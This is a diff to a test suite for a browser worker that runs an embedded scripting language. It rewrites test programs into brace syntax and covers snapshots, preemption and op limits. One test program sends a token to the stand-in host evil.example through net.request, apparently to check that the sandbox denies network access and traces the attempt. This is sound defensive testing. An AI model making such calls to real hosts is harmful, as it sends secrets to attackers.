@@ -14,8 +14,8 @@ const cases = JSON.parse(readFileSync(new URL("./js.json", import.meta.url)));
 const PKG = JSON.parse(readFileSync(new URL("./app/edge.json", import.meta.url)));
 // Negative fixtures, only their own cases import them, abi2 and ui fail to load by design.
 const FIXTURES = new Set(["trap", "abi2", "ui"]);
-// star-import every module the app carries, packages are imported by the cases that use them
-const star = (imports) => Object.entries(imports).flatMap(([k, v]) => (FIXTURES.has(k) || !String(v).startsWith("./") ? [] : `from ${k} import *`));
+// use every module the app carries, packages are used by the cases that need them
+const star = (imports) => Object.entries(imports).flatMap(([k, v]) => (FIXTURES.has(k) || !String(v).startsWith("./") ? [] : `use ${k}`));
 const PRELUDE = star(PKG.imports).join("\n") + "\n";
 const TYPES = {
     ".js": "text/javascript", ".wasm": "application/wasm", ".html": "text/html",
@@ -118,7 +118,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
             const worker = globalThis.worker;
             const chunks = [];
             worker.onOutput((c) => chunks.push(c));
-            const src = "history = []\nwhile true:\n    m = receive()\n    if m == 'stop':\n        break\n    history.append(m)\nprint('|'.join(history))";
+            const src = "history = []\nwhile true {\n    m = receive()\n    if m == \"stop\" {\n        break\n    }\n    history.append(m)\n}\nprint(\"|\".join(history))";
             const running = worker.run(src);
             const parked = async () => {
                 for (let i = 0; i < 100; i++) {
@@ -146,7 +146,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         });
         if (snap.first !== "a|b\n") throw new Error(`snapshot: original run produced ${JSON.stringify(snap.first)}`);
         if (snap.second !== "a|c|d\n") throw new Error(`snapshot: restored run produced ${JSON.stringify(snap.second)}`);
-        if (snap.globalsAtSave.history !== "['a']") throw new Error(`snapshot: stateGlobals saw ${JSON.stringify(snap.globalsAtSave)}`);
+        if (snap.globalsAtSave.history !== '["a"]') throw new Error(`snapshot: stateGlobals saw ${JSON.stringify(snap.globalsAtSave)}`);
         if (!(snap.blobLen > 100)) throw new Error(`snapshot: implausible blob length ${snap.blobLen}`);
 
         // A suspension-free program still pauses and snapshots.
@@ -155,7 +155,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
             const chunks = [];
             worker.onOutput((c) => chunks.push(c));
             await worker.setPreemptInterval(50000);
-            const src = "n = 0\nwhile n < 1000000:\n    n = n + 1\nprint('done', n)";
+            const src = "n = 0\nwhile n < 1000000 {\n    n = n + 1\n}\nprint(\"done\", n)";
             const running = worker.run(src);
             await worker.pause();
             const globalsAtPause = await worker.stateGlobals();
@@ -203,7 +203,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         const capped = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
             const worker = await createWorker({ wasmUrl: "https://edge.test/edge.wasm", limits: { ops: 1000 } });
-            const { out } = await worker.run("n = 0\nfor i in range(100000):\n    n = n + 1\nprint(n)");
+            const { out } = await worker.run("n = 0\nfor i in range(100000) {\n    n = n + 1\n}\nprint(n)");
             worker.dispose();
             return out;
         }, `https://${CDN_HOST}/js/src/index.js`);
@@ -215,7 +215,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
             const worker = await createWorker({ wasmUrl: "https://edge.test/edge.wasm", trace: true, permissions: { main: ["net"] } });
             const events = [];
             worker.onTrace((event) => events.push(event));
-            await worker.run("import net\nprint('read it')\ntry:\n    net.request('GET', 'https://evil.example/x?token=t-456', {}, nil)\nexcept PermissionError as e:\n    pass\n");
+            await worker.run("use net\nprint(\"read it\")\ntry {\n    net.request(\"GET\", \"https://evil.example/x?token=t-456\", {}, nil)\n} catch PermissionError as e {\n}\n");
             worker.dispose();
             return events;
         }, `https://${CDN_HOST}/js/src/index.js`);
